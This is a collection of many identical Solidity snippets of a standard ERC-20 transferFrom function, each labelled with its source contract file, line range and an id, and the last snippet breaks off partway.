<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="86" endline="95" pcid="8900">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="90" endline="99" pcid="4244">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="87" endline="96" pcid="1600">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="86" endline="95" pcid="8588">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="85" endline="94" pcid="5753">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="67" endline="76" pcid="6554">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="86" endline="95" pcid="5021">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="85" endline="94" pcid="6542">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="89" endline="98" pcid="1374">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="89" endline="98" pcid="1202">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="88" endline="97" pcid="5256">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="86" endline="95" pcid="1263">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="86" endline="95" pcid="216">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="85" endline="94" pcid="1024">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="85" endline="94" pcid="3808">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="86" endline="95" pcid="7269">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="86" endline="95" pcid="7610">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="89" endline="98" pcid="8870">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="87" endline="96" pcid="422">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="85" endline="94" pcid="5768">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="179" endline="188" pcid="4175">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="90" endline="99" pcid="2423">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="88" endline="97" pcid="3182">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="86" endline="95" pcid="2769">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="87" endline="96" pcid="3197">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="88" endline="97" pcid="3212">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="85" endline="94" pcid="1313">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="90" endline="99" pcid="2408">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="85" endline="94" pcid="8488">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="84" endline="93" pcid="5487">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="188" endline="197" pcid="6737">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="86" endline="95" pcid="2754">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="705" endline="714" pcid="6829">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="86" endline="95" pcid="3227">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="88" endline="97" pcid="3242">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="88" endline="97" pcid="3257">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="87" endline="96" pcid="6368">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="89" endline="98" pcid="2739">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="180" endline="189" pcid="2393">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="83" endline="92" pcid="3277">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="86" endline="95" pcid="3292">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="86" endline="95" pcid="2378">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="84" endline="93" pcid="3793">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="82" endline="91" pcid="2724">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="85" endline="94" pcid="9211">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="90" endline="99" pcid="2054">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="87" endline="96" pcid="7300">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="84" endline="93" pcid="6520">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="88" endline="97" pcid="3671">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="89" endline="98" pcid="9233">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="87" endline="96" pcid="3653">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="87" endline="96" pcid="3313">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="82" endline="91" pcid="2237">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="88" endline="97" pcid="5271">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="91" endline="100" pcid="3624">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="89" endline="98" pcid="3601">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="91" endline="100" pcid="2084">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="83" endline="92" pcid="4891">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="89" endline="98" pcid="2707">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="88" endline="97" pcid="231">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="90" endline="99" pcid="2252">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="87" endline="96" pcid="7330">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="88" endline="97" pcid="3583">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="88" endline="97" pcid="698">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="87" endline="96" pcid="6430">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="85" endline="94" pcid="3328">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="86" endline="95" pcid="2363">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="92" endline="101" pcid="582">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="83" endline="92" pcid="4367">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="85" endline="94" pcid="8786">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="84" endline="93" pcid="3348">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="89" endline="98" pcid="2630">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="84" endline="93" pcid="2692">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="84" endline="93" pcid="4035">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="85" endline="94" pcid="2348">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="84" endline="93" pcid="8618">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="89" endline="98" pcid="4159">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="86" endline="95" pcid="2677">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="87" endline="96" pcid="4111">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="89" endline="98" pcid="3568">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="86" endline="95" pcid="1615">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="86" endline="95" pcid="9281">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="87" endline="96" pcid="3553">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="88" endline="97" pcid="2271">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="89" endline="98" pcid="7580">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="84" endline="93" pcid="9296">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="82" endline="91" pcid="3533">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="149" endline="158" pcid="3518">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="72" endline="81" pcid="4918">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="87" endline="96" pcid="4797">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="413" endline="422" pcid="9317">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="64" endline="73" pcid="3501">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="88" endline="97" pcid="2292">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
